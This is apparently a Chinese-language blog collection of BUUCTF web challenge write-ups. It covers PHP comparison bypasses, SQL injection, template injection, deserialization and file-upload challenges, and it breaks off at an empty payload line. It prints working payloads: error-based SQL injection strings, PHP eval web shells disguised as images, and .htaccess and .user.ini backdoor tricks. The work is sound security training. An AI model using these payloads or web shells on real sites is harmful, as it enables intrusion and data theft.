+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227193763-c137cc79-38c0-4db5-959b-49ffa70aab40.png" alt="img"></p>
+<p>然后下载得到一个index.php.bak文件</p>
+<pre><code class="language-plain">&lt;?php
+include_once &quot;flag.php&quot;;
+
+if(isset($_GET[&#39;key&#39;])) &#123;
+    $key = $_GET[&#39;key&#39;];
+    if(!is_numeric($key)) &#123;
+        exit(&quot;Just num!&quot;);
+    &#125;
+    $key = intval($key);
+    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
+    if($key == $str) &#123;
+        echo $flag;
+    &#125;
+&#125;
+else &#123;
+    echo &quot;Try to find out source file!&quot;;
+&#125;
+</code></pre>
+<p>这里需要传入的key为数字，但是又与$str相等。这里就直接用弱比较绕过了，</p>
+<p>直接传入?key&#x3D;123</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227492329-51523f01-2b33-4092-a3cc-795cbca3618e.png" alt="img"></p>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>首先认识几个函数：</p>
+<p>scandir()：读取指定目录中的所有文件和目录。并返回一个包含这些文件和目录名称和数组</p>
+<p>var_dump()：输出变量的值（数组，类都可以）</p>
+<p>glob()：查找匹配特定模式的文件路径，它支持使用通配符来查找文件。</p>
+<p>如：</p>
+<pre><code class="language-plain">$files = glob(&#39;/path/to/directory/*.txt&#39;);
+print_r($files);
+</code></pre>
+<p>这题的话是一个计算机，但是查看源码后可以看到有一个路径。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733235763015-18ed15a2-2798-4f7c-ae38-8a6fa6a91c55.png" alt="img"></p>
+<p>但是这题不能传入字母</p>
+<p>因为num不可以传入字母，但是我们在num参数之前添加一个空格，这样在PHP的语言特性下会默认删除这个空格，但是WAF会因为这个空格导致检测不到num这个参数，最终导致WAF被绕过。</p>
+<p>绕过方式：在参数之前加一个空格就可以绕过</p>
+<p>传入参数（这里  &#x2F;  被过滤了，就用chr(47)来代替：</p>
+<p>&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)));</p>
+<p>看到flag</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733235965264-fda9375f-46ea-4a33-950d-7685d2edc128.png" alt="img"></p>
+<p>然后用file_get_content来读取flag</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733236275163-7ccbebb6-e4a6-46b5-8246-f3fcebfa5b5e.png" alt="img"></p>
+<p>最后的payload：</p>
+<p>&#x2F;calc.php?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p>
+<p>或者使用其他的文件读取函数也行：</p>
+<p>readfile</p>
+<p>var_dump(file())</p>
+<p>include</p>
+<p>show_source</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题在pay.php中发现了要给源码。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733236886323-d60dbf5f-f230-4536-9a94-acf4e0d09e68.png" alt="img"></p>
+<p>就这样吧。最后一个支付flag用科学计数法绕过就行了</p>
+<pre><code class="language-plain">POST /pay.php HTTP/1.1
+Host: c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Referer: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81/
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Origin: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81
+Cookie: user=1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Content-Length: 14
+
+password=404ac&amp;money=10e10
+</code></pre>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237167819-29a60e0a-41a6-4850-91bf-e2299e6d85e6.png" alt="img"></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>抓包之后看到这样：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237350103-5656e1b1-baa0-4ffc-80b1-de7144f1efff.png" alt="img"></p>
+<p>即经过md5加密后是万能密码的形式有</p>
+<p>ffifdyop</p>
+<p>传入这个参数，</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237472398-d0fc213e-77ab-4950-ac89-2029fabc2893.png" alt="img"></p>
+<p>用数组绕过：?a[]&#x3D;1&amp;b[]&#x3D;12</p>
+<p>第二还是一样</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237634278-2c461dc5-515d-401b-a8ca-5c78f7a24164.png" alt="img"></p>
+<p>因为加密后是0e开头，最后比较时候会进行科学计数法转化（都为0）再比较，</p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>这题在这里找到了一份源码文件，但是，这个文件已经被师傅删了</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733301932258-d715ced9-c0fd-45b0-8be6-b4b3b0e5f135.png" alt="img"></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733301980567-cdfb126a-42a6-46a9-a25a-86749883b90a.png" alt="img"></p>
+<p>止步。。</p>
+<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>这题不能上传php文件，bp抓包改后也不能，思路就是先传一个.htaccess文件</p>
+<p>修改content-type:image&#x2F;png</p>
+<p>内容为：AddType application&#x2F;x-httpd-php .png</p>
+<p>将所以png后缀当作php解析，数据包：</p>
+<pre><code class="language-plain">POST /upload.php HTTP/1.1
+Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------64109611113320769853041448004
+Content-Length: 381
+Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
+Connection: keep-alive
+Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/
+Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------64109611113320769853041448004
+Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;
+Content-Type: image/png
+
+AddType application/x-httpd-php .png
+-----------------------------64109611113320769853041448004
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+一键去世
+-----------------------------64109611113320769853041448004--
+</code></pre>
+<p>然后再上传一个图片🐎：</p>
+<pre><code class="language-plain">POST /upload.php HTTP/1.1
+Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------1985058255358904272254780689
+Content-Length: 683
+Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81
+Connection: keep-alive
+Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/
+Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------1985058255358904272254780689
+Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.png&quot;
+Content-Type: image/png
+
+GIF89a
+&lt;?= eval($_POST[1]);?&gt;
+�PNG
+</code></pre>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303170220-34e1cdbd-ef1a-4692-91fa-e1b74e17f863.png" alt="img"></p>
+<p>最后成功执行命令：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303190507-6cb0cf8c-b712-4b11-b3b8-5b8d35a15ffa.png" alt="img"></p>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目打开就是三个文件：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304424321-79abc153-5667-443d-9d1f-07956ad5593b.png" alt="img"></p>
+<p> &#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag  </p>
+<p> &#x2F;welcome.txt<br>render  </p>
+<p> &#x2F;hints.txt<br>md5(cookie_secret+md5(filename))  </p>
+<p>并且在访问这个几个文件的时候参数会发生变化</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304528614-1941adf3-c209-40d8-becd-e22af4db1891.png" alt="img"></p>
+<p>filehash的值看起来是一个md5跟hints.txt有关联</p>
+<p>要拿到flag，那么filename&#x3D;&#x2F;fllllllllllllag  </p>
+<p>md5加密后：3bf9f6cf685a6dd8defadabfb41a03a1</p>
+<p>此时还缺一个 cookie_secret  ，题目叫easy_tornado。tornado是python的一个模块，跟模板注入有关</p>
+<p>当我们输入一个错误的md5时，参数会发生变化error?msg&#x3D;Error，然后Error就显示在页面上（这里已经很明显了）</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304805163-596d90bd-7f49-4bba-8ff2-b9cef5edff25.png" alt="img"></p>
+<p>直接测试1<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304887984-7acfbc96-b287-4562-a099-f26f41a50bda.png" alt="img">	果然是tornado模板注入</p>
+<p>在tornado中，存在一些可以访问的快速对象，这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
+<p>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305105319-7db96744-6715-4e07-abc2-2d5389313e2f.png" alt="img"></p>
+<p>拿到 cookie_secret  ： a4fd7b8a-9c2c-4f31-ae10-d47652936f8c  </p>
+<p>最后进行md5加密就可以了，MD5(a4fd7b8a-9c2c-4f31-ae10-d47652936f8c+3bf9f6cf685a6dd8defadabfb41a03a1）计算，可以先把这两个字符串拼接起来最后再进行md5加密</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305277519-c9935bf3-ce67-44b3-82ed-e12e1d0dba29.png" alt="img"></p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305269827-94e113f5-e319-49ff-ab76-110dc347d23c.png" alt="img"></p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>这题打开是一个php代码</p>
+<pre><code class="language-plain"> &lt;?php  
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+$password = $_GET[&quot;password&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file))&#123;
+        echo &quot;Not now!&quot;;
+        exit(); 
+    &#125;else&#123;
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    &#125;
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt; 
+</code></pre>
+<p>第一个条件需要$text的内容为welcome to the zjctrf</p>
+<p>这个可以用data协议：data:&#x2F;&#x2F;text&#x2F;plain,<code>welcome to the zjctf</code></p>
+<p>或者使用ssrf（在服务器写入所需要存在的信息）</p>
+<p>但是题目给了一个<code>//useless.php</code>，并且最后还需要反序列化，所以还需要将这个文件的内容搞出来。</p>
+<p>正好后面有个include，可以用文件包含</p>
+<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<p>最后解码得到</p>
+<pre><code class="language-plain">&lt;?php  
+
+class Flag&#123;  //flag.php  
+    public $file;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+?&gt;  
+</code></pre>
+<p>因为最后是echo password，最后可以触发tostring魔术方法。沿着这个思路可以将php写出来了：</p>
+<pre><code class="language-plain">&lt;?php
+
+class Flag&#123;  //flag.php
+    public $file=&#39;flag.php&#39;;
+&#125;
+echo serialize(new Flag());
+?&gt;
+</code></pre>
+<p>最后的payload：</p>
+<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733317111259-90c0610a-7261-4bf3-accf-9aa610247626.png" alt="img"></p>
+<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>一道代码题</p>
+<pre><code class="language-plain">I put something in F12 for you
+include &#39;flag.php&#39;;
+$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
+    $id=$_GET[&#39;id&#39;];
+    $gg=$_GET[&#39;gg&#39;];
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) &#123;
+            $passwd=$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            &#123;
+                 if($passwd==1234567)
+                 &#123;
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 &#125;
+                 else
+                 &#123;
+                     echo &quot;can you think twice??&quot;;
+                 &#125;
+            &#125;
+            else&#123;
+                echo &#39;You can not get it !&#39;;
+            &#125;
+
+        &#125;
+        else&#123;
+            die(&#39;only one way to get the flag&#39;);
+        &#125;
+&#125;
+    else &#123;
+        echo &quot;You are not a real hacker!&quot;;
+    &#125;
+&#125;
+else&#123;
+    die(&#39;Please input first&#39;);
+&#125;
+&#125;Please input first
+</code></pre>
+<p>第一个条件直接数组绕过。</p>
+<p>第二个条件在数字后面加上字母进行弱比较绕过</p>
+<p>payload：</p>
+<p>get：?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
+<p>post：passwd&#x3D;1234567a</p>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>fuzz跑一下</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733320335167-92e223af-bf64-4645-bfde-171f8c6b251b.png" alt="img"></p>
+<p>union被过滤了还有等号，那么联合注入和bool注入就用不了。</p>
+<p>但是报错注入的关键字没有被过滤。空格被过滤了还可以用括号进行绕过</p>
+<p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(1,(concat(0x7e,database())),3))%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733320838696-be5b5597-77f6-41e5-8c89-64bac2454dfa.png" alt="img"></p>
+<p>爆表名，payload：</p>
+<p>1&amp;password&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))%23</p>
+<p>或者concat也可以使用两个参数;</p>
+<p>1’or(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))),0))%23</p>
+<p>但是这题#好像不能使用，需要用%23，这里的括号绕过空格语法是：去掉空格然后加上左括号，最后在from，where，like，or等这些连接词前加上右括号。</p>
+<p>爆列名：</p>
+<p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(0,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))),0))%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733323370405-b2a3586a-2a2d-4f1f-91eb-b01d46d2cd29.png" alt="img"></p>
+<p>最后拿flag：</p>
+<p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(0,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),0))%23</p>
+<p>因为substr和mid被禁了，所以用right（left也行）</p>
+<p>payload：</p>
+<p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733323824220-9bcdc991-66ad-4858-93e3-0696ac851af8.png" alt="img"></p>
+<p>最后将flag拼上</p>
+<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>这题是一道反序列化题目</p>
+<pre><code class="language-plain"> &lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler &#123;
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() &#123;
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    &#125;
+	//进行赋值，然后调用process()函数
+
+    public function process() &#123;
+        if($this-&gt;op == &quot;1&quot;) &#123;
+            $this-&gt;write();
+        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        &#125;
+    &#125;
+	//如果op=1，调用write函数。等于2调用output函数
+
+    private function write() &#123;
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
+            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            &#125;
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Failed!&quot;);
+        &#125;
+    &#125;
+	//content长度不能大于100，将content内容写入进filename并赋值为res。
+
+    private function read() &#123;
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) &#123;
+            $res = file_get_contents($this-&gt;filename);
+        &#125;
+        return $res;
+    &#125;
+	//如果filename设置，返回filename的文件内容
+
+    private function output($s) &#123;
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    &#125;
+	//输出变量内容
+
+    function __destruct() &#123;
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    &#125;
+
+&#125;
+//如果op=2，强制将op设置为1，然后将content赋值为空。最后调用process()函数
+
+function is_valid($s) &#123;
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+&#125;
+//要求字符为可见字符
+
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) &#123;
+        $obj = unserialize($str);
+    &#125;
+
+&#125;
+</code></pre>
+<p>思路就是用比较绕过destruct魔术方法，然后进行文件读取。</p>
+<p>反序列化触发</p>
+<p>​    function __destruct() {</p>
+<p>​        if($this-&gt;op &#x3D;&#x3D;&#x3D; “2”)</p>
+<p>​            $this-&gt;op &#x3D; “1”;</p>
+<p>​        $this-&gt;content &#x3D; “”;</p>
+<p>​        $this-&gt;process();</p>
+<p>​    }</p>
+<p>最后调用</p>
+<p>​    public function process() {</p>
+<p>​        if($this-&gt;op &#x3D;&#x3D; “1”) {</p>
+<p>​            $this-&gt;write();</p>
+<p>​        } else if($this-&gt;op &#x3D;&#x3D; “2”) {</p>
+<p>​            $res &#x3D; $this-&gt;read();</p>
+<p>​            $this-&gt;output($res);</p>
+<p>​        } else {</p>
+<p>​            $this-&gt;output(“Bad Hacker!”);</p>
+<p>​        }</p>
+<p>​    }</p>
+<p>这里能够读取文件的就是：</p>
+<p>​            $res &#x3D; $this-&gt;read();</p>
+<p>​            $this-&gt;output($res);</p>
+<p>所以要让op的值为2，但是__destruct有个判断（是一个强比较与字符串2进行判断，这里可以用数字2绕过）</p>
+<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>php脚本：</p>
+<pre><code class="language-plain">&lt;?php
+class FileHandler &#123;
+
+    protected $op=2;
+    protected $filename=&#39;flag.php&#39;;
+    protected $content;
+&#125;
+$a=serialize(new FileHandler());
+echo &quot;\n&quot;;
+$a=str_replace(&quot;s&quot;,&quot;S&quot;,$a);//利用大写S采用的十六进制，来绕过is_valid中对空字节的检查
+echo $a;
+</code></pre>
+<p>最后将%00换成\00</p>
+<p>payload:</p>
+<p>O:11:”FileHandler”:3:{S:5:”\00*\00op”;i:2;S:11:”\00*\00filename”;S:8:”flag.php”;S:10:”\00*\00content”;N;}<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405163823-cbcdc163-65d7-4347-8927-e312baf2fd5b.png" alt="img"></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>php7.1+的版本对属性类型不敏感，本地序列化的时候将protected属性改为public进行绕过。</p>
+<p>对于php版本可以在响应头中看到：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405556651-f3f966e7-2920-491b-be4e-74467bb8ad96.png" alt="img">	</p>
+<pre><code class="language-plain">&lt;?php
+class FileHandler&#123;
+    public $op=2;
+    public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
+    public $content=2;
+&#125;
+$a = new FileHandler();
+echo serialize($a);
+</code></pre>
+<p>payload：</p>
+<p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;i:2;}</p>
+<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>最后发现image&#x2F;jpeg是能够上传的</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405774988-18c39a0a-5d93-4171-970e-fd9595533d94.png" alt="img"></p>
+<p>然后发现服务器是openresty，它是基于nigix，而nigix也是可以支持.htaccess文件的（通常支持.htaccess的是apache）</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406200700-7ada14ce-b1ee-460b-aae4-6f80ae085b8c.png" alt="img"></p>
+<p>然后上传一个.htaccess文件。改content-type:image&#x2F;jpeg</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406116287-3f9169c9-fecc-4cc8-903b-449f66b2cfe9.png" alt="img"></p>
+<p>成功执行命令。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406064956-401a03df-e676-4c60-b383-5f56b2052d73.png" alt="img"></p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>这题可以用usr.ini配置文件来构造一个后门。首先来认识两个配置项：</p>
+<p>auto_preappend_file：指定一个文件，自动包含在要执行的文件前。类似于require()函数。</p>
+<p>auto_append_file：指定一个文件，在文件后包含。</p>
+<p>这题先上传一个.usr.ini文件，内容为：</p>
+<pre><code class="language-http">GIF89A
+auto_prepend_file=a.jpg
+</code></pre>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544545603-da99bc5e-1d01-417d-a72f-7392d03d6dc3.png" alt="img"></p>
+<p>然后再上传一个a.jpg</p>
+<pre><code class="language-http">GIF89a 
+&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt;
+</code></pre>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544724822-45c8d4fb-b447-48d5-ac03-38e3788a812c.png" alt="img"></p>
+<p>最后访问路径+index.php，执行命令成功执行。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544621014-c7db06fd-8082-4a85-9e75-a271d2ed87f3.png" alt="img"></p>
+<h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>查看源码发现一段base32源码:</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549472085-ae5bf173-ed09-4aec-9353-585303f7ea70.png" alt="img"></p>
+<p>经过base32解码，base64解码，最后得到一条sql语句：</p>
+<p>select * from user where username &#x3D; ‘$name’</p>
+<p>然后判断列数为3列。</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549910201-3400eea6-701f-4e8a-9a08-b12481ae83e7.png" alt="img"></p>
+<p>这三列通常是id，username，passwd。</p>
+<p>这里也可以进行验证：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549955104-bbb30b59-0114-4e58-8077-6db4554af8db.png" alt="img"></p>
+<p>报错没有这个user。</p>
+<p>当换成admin的时候：报错密码错误。由此猜测第二列为username</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550004184-a185f560-99a2-4bd7-877b-2a28fb5b7838.png" alt="img"></p>
+<p>这道题用到的知识点就是，使用union联合查询的时候，会在表里新增联合查询的内容</p>
+<p>如下：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550135519-3cfcf296-a3dd-4d73-b3b5-3e994b3f3ca6.png" alt="img"></p>
+<p>利用这点，我们可以新增一个admin，然后将密码覆盖为123</p>
+<p>但是打渗透的话就会知道，密码数据库里面的密码通常是经过加密的，最后密码试了以下md5加密，就出来了	</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550429201-c75b9671-d092-4daf-887e-ef24904632b8.png" alt="img"></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>查询数据库：</p>
+<p>show databases;</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546629736-ed7cb966-e627-4b60-9e2b-42e381f8b5e6.png" alt="img"></p>
+<p>查询表：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546667657-ef0c08e3-fbe4-43b0-8deb-3c02245ac8bd.png" alt="img"></p>
+<p>用handler查询flag：</p>
+<p>payload:</p>
